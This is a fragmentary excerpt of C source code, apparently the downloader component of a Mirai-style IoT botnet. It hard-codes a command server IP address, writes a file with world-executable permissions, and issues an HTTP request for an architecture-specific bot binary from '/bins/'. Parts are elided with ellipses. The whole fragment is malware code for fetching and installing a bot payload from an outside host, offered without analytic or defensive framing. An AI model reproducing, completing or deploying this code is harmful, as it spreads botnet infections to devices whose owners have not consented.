...
#define HTTP_SERVER utils_inet_addr(107,172,165,189) //you need to put a "," for each "."

#define EXEC_MSG            "eBot\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "eBot\n"
...
inline void run(void)
{
    ...
    ffd = open("hu87VhvQPz", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/" BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
